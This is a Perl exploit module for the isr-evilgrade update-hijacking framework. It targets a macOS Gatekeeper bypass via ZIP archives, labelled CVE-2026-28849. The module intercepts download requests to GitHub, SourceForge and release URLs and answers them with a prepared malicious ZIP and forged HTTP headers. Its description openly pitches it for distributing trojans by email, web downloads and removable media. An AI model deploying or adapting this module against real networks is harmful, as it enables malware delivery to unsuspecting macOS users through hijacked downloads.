###############
# macos_gatekeeper_zip.pm
#
# CVE-2026-28849: Gatekeeper bypass via ZIP archive
# ZIP files with special structures bypass notarization requirements
# Allows execution of unsigned/unnotarized code with user interaction
#
# This file is part of isr-evilgrade, www.faradaysec.com .

package modules::macos_gatekeeper_zip;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'macOS Gatekeeper ZIP Bypass',
    'version'     => '1.0',
    'appver'      => 'macOS Sequoia, Sonoma, Ventura (all current versions)',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Exploits CVE-2026-28849: Gatekeeper bypass via ZIP archive structure.
ZIP files containing unsigned applications bypass Gatekeeper on extraction.
Requires user to double-click ZIP to extract and run (social engineering).
Useful for distributing trojans via email, web downloads, removable media.
    },
    'vh' => '(.*download.*|.*release.*|github\.com|sourceforge\.net)',
    'request' => [
        {
            'req'   => '/.*\.zip',
            'type'  => 'file',
            'file'  => './include/macos/gatekeeper_bypass.zip',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/zip\r\n"
                . "Content-Disposition: attachment; filename=Application.zip\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'   => '/releases/download/.*\.zip',
            'type'  => 'file',
            'file'  => './include/macos/gatekeeper_bypass.zip',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/zip\r\n"
                . "Content-Disposition: attachment; filename=release.zip\r\n"
                . "Connection: close\r\n\r\n",
        },
    ],
};

sub new {
    my $class = shift;
    my $self = $base;
    bless( $self, $class );
    return $self;
}

1;
